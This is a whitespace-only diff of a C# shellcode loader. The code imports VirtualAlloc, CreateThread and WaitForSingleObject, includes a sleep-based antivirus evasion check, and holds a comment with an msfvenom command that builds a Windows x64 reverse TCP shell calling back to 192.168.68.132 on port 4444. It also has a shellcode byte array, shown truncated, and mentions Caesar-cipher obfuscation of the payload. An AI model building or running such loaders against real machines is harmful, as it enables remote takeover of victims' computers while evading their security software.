@@ -12,7 +12,7 @@ namespace ConsoleApp1
         [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
         [DllImport("kernel32", CharSet = CharSet.Ansi)] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
         [DllImport("kernel32.dll", SetLastError = true)] static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-	    [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);
+        [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);
         static void Main(string[] args)
         {
             // Basic sleep av evasion
@@ -24,7 +24,7 @@ namespace ConsoleApp1
                 return;
             }
             
-	        //  msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.68.132 LPORT=4444 -f csharp -o rev.txt
+            //  msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.68.132 LPORT=4444 -f csharp -o rev.txt
             byte[] buf = new byte[510] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,...};
 
             // Simple Ceasar cipher shift
